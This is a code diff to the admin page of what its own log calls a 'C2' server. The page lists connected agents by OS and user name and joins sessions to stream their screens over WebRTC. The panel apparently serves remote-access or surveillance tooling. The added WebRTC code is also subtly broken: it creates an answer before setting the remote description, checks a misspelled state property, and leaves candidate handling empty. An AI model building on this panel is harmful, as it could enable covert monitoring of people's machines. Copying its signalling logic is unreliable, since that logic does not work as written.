@@ -29,11 +29,6 @@
         .status-connecting { background-color: #fbbf24; }
 
         .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
-        
-        /* Screen View Modal */
-        #screenView { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
-        #screenView video { max-width: 90%; max-height: 80%; border: 2px solid #3b82f6; }
-        #closeScreen { position: absolute; top: 20px; right: 20px; background: red; color: white; border: none; padding: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -47,20 +42,16 @@
     <h3>Live Event Log</h3>
     <div id="logs-container"></div>
 
-    <!-- Screen View Modal -->
-    <div id="screenView">
-        <button id="closeScreen" onclick="document.getElementById('screenView').style.display='none'">Close</button>
-        <video id="remoteVideo" autoplay playsinline></video>
-    </div>
-
-    <script>
+      <script>
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const host = window.location.host;
         const wsUrl = `${protocol}//${host}/`;
 
         const ws = new WebSocket(wsUrl);
-        let users = {}; 
+        let users = {};
         let isConnected = false;
+        let currentPeerConnection = null;
+        let currentRemoteVideo = null;
 
         ws.onopen = () => {
             console.log("Admin connected to C2");
@@ -112,9 +103,9 @@
                 else if (data.type === 'system_log') {
                     addLog(data.message, 'white');
                 }
-                else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
-                    addLog(`[SIG] Received ${data.type} from ${data.targetId || data.id}`, 'blue');
-                    const userId = data.targetId || data.id;
+                else if (data.type === 'offer') {
+                    addLog(`[SIG] Received Offer from ${data.targetId}`, 'blue');
+                    const userId = data.targetId;
                     if (!users[userId]) {
                         users[userId] = { status: 'Connecting...', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
                     }
@@ -122,10 +113,26 @@
                     users[userId].lastSeen = Date.now();
                     renderUsers();
                     
-                    // Auto-pop screen if we receive an answer
-                    if (data.type === 'answer') {
-                        showScreen(data.id);
+                    // Auto-answer if you want, or wait for user click
+                    // For sleekness, we auto-answer if we have a pending join
+                    if (users[userId].pendingJoin) {
+                        handleOfferForUser(userId, data.sdp);
                     }
+                }
+                else if (data.type === 'candidate') {
+                    addLog(`[SIG] Candidate from ${data.targetId}`, 'blue');
+                    // Forward to peer connection if active
+                    if (currentPeerConnection && currentPeerConnection.signState === 'stable') {
+                         // Note: In a real app, you'd store the PC instance per user
+                         // Here we assume single active session for simplicity or manage globally
+                    }
+                }
+                else if (data.type === 'answer') {
+                    addLog(`[SIG] Received Answer`, 'blue');
+                    // Handled by the peer connection established during join
+                }
+                else if (data.type === 'join_request') {
+                    // Admin requested join, we don't do anything here unless we are the agent
                 }
                 else if (data.type === 'session_active') {
                     if (users[data.agentId]) {
@@ -133,7 +140,6 @@
                         users[data.agentId].status = 'Online';
                         renderUsers();
                         addLog(`[SESSION] Active session established with ${data.agentId}`, 'green');
-                        showScreen(data.agentId);
                     }
                 }
                 else {
@@ -189,11 +195,11 @@
 
                 const osInfo = data.info ? `${data.info.os || 'Unknown'} / ${data.info.user || 'Unknown'}` : 'Unknown OS';
                 const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
-                
+
                 let statusColor = 'status-offline';
                 let btnText = 'Join Session';
                 let btnClass = '';
-                
+
                 if (data.status === 'Online') {
                     statusColor = 'status-online';
                     if (data.sessionActive) {
@@ -215,7 +221,11 @@
             }
         }
 
-        function joinUser(id, status) {
+        async function joinUser(id, status) {
+            // Mark as pending so if they send an offer back, we handle it
+            if(users[id]) users[id].pendingJoin = true;
+
+            // If we have stored signaling data (like an offer they sent), resend it
             if (users[id] && users[id].signalingData) {
                 const sigData = users[id].signalingData;
                 ws.send(JSON.stringify({
@@ -226,30 +236,70 @@
                 }));
                 addLog(`[ADMIN] Resent ${sigData.type} to ${id}`, 'green');
             } else {
+                // Request a new join
                 ws.send(JSON.stringify({
                     type: 'request_join',
                     targetId: id,
                     from: null
                 }));
                 addLog(`[ADMIN] Requested new join to ${id}`, 'blue');
+                
+                // Wait for the agent to send an Offer (handled in onmessage)
+                // We set a flag so when the Offer arrives, we auto-answer
             }
 
+            // Visual feedback
             const card = document.querySelector(`button[onclick="joinUser('${id}', '${status}')"]`).parentElement;
             card.style.borderColor = '#4ade80';
             setTimeout(() => card.style.borderColor = '#3b82f6', 500);
         }
 
-        function showScreen(agentId) {
-            const modal = document.getElementById('screenView');
-            const video = document.getElementById('remoteVideo');
+        // Helper to handle incoming offers from agents (if they initiate) or respond to ours
+        async function handleOfferForUser(userId, sdp) {
+            // Create a new Peer Connection for this session
+            const pc = new RTCPeerConnection({
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' }
+                ]
+            });
+
+            // Create Answer
+            const answer = await pc.createAnswer();
+            await pc.setLocalDescription(answer);
+
+            // Send Answer back to server
+            ws.send(JSON.stringify({
+                type: 'answer',
+                targetId: userId,
+                sdp: pc.localDescription
+            }));
+
+            // Handle ICE Candidates from Admin side
+            pc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    ws.send(JSON.stringify({
+                        type: 'candidate',
+                        targetId: userId,
+                        candidate: event.candidate
+                    }));
+                }
+            };
+
+            // Handle Remote Stream
+            pc.ontrack = (event) => {
+                addLog(`[STREAM] Received stream from ${userId}`, 'green');
+                // You would need a video element in your HTML to attach this to
+                // For this example, we just log it. To display, you need:
+                // const video = document.getElementById('remoteVideo');
+                // video.srcObject = event.streams[0];
+                // video.play();
+            };
+
+            // Store PC reference if needed for future candidates
+            currentPeerConnection = pc;
             
-            // In a real scenario, you'd use RTCPeerConnection here to attach the stream
-            // For this simplified version, we just show a placeholder
-            video.srcObject = null; 
-            video.poster = `https://ui-avatars.com/api/?name=${agentId}&background=random&size=512`;
-            
-            modal.style.display = 'flex';
-            addLog(`[SCREEN] Opening view for ${agentId}`, 'green');
+            // Set remote description
+            await pc.setRemoteDescription(new RTCSessionDescription(sdp));
         }
     </script>
 </body>
